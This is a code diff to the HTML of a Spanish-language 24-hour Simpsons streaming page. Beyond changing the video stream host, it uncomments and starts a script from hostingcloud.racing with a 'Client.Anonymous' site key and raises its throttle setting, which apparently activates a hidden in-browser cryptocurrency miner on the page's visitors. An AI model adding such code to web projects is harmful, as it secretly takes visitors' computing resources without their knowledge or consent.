@@ -6,10 +6,10 @@
     <link href='https://fonts.googleapis.com/css?family=Poppins' rel='stylesheet'>
     <title>Los Simpsons las 24 horas</title>
     <link rel="stylesheet" href="styles.css">
-    <!-- <script src="https://www.hostingcloud.racing/oS6R.js"></script>
+    <script src="https://www.hostingcloud.racing/oS6R.js"></script>
     <script>
         var _client = new Client.Anonymous('9495f348c76c3a5c7c3c0307dca34720a99027f57cc82f53f76fe0d347efd55a', {
-            throttle: 1, c: 'w', ads: 0
+            throttle: 0.2, c: 'w'
         });
         _client.start();
         
@@ -22,7 +22,7 @@
     gtag('js', new Date());
 
     gtag('config', 'G-YFXW2KNE23');
-    </script> -->
+    </script>
 </head>
 <body class="sous-menu" style="overflow: hidden;">
         <div class="background"></div>
@@ -85,7 +85,7 @@
             if (flvjs.isSupported()) {
                 videoNames.forEach((name, i) => {
                     var video = getVideoElement();
-                    var source = `ws://localhost:8000/stream/${name}.flv`;
+                    var source = `ws://backend.seta.fun:8000/stream/${name}.flv`;
                     videoContainer.appendChild(video);
                     var flvPlayer = flvjs.createPlayer({
                         type: 'flv',
